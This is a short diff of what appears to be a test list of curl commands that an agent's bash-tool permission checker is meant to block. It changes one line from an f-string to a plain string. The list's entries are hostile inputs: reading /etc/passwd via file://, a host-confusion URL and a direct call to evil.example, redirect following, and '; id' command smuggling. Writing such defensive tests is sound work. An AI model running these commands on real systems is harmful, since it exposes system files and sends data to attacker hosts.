@@ -73,7 +73,7 @@ def _bash(prof, cwd, command):
     f"curl -sS -g --path-as-is -K /etc/x {API}/contents/a",
     f"curl -sS -g --path-as-is {API}/contents/x file:///etc/passwd",      # a second URL
     f'curl -sS -g --path-as-is "{API}/contents/x" "file:///etc/passwd"',
-    f"curl -sS -g --path-as-is https://api.github.com@evil.example/repos/dimagi-internal/ada/contents/x",
+    "curl -sS -g --path-as-is https://api.github.com@evil.example/repos/dimagi-internal/ada/contents/x",
     "curl -sS -g --path-as-is https://evil.example/",
     f"curl -sS -g --path-as-is -L {API}/contents/x",
     f"curl -sS -g --path-as-is {API}/contents/x; id",
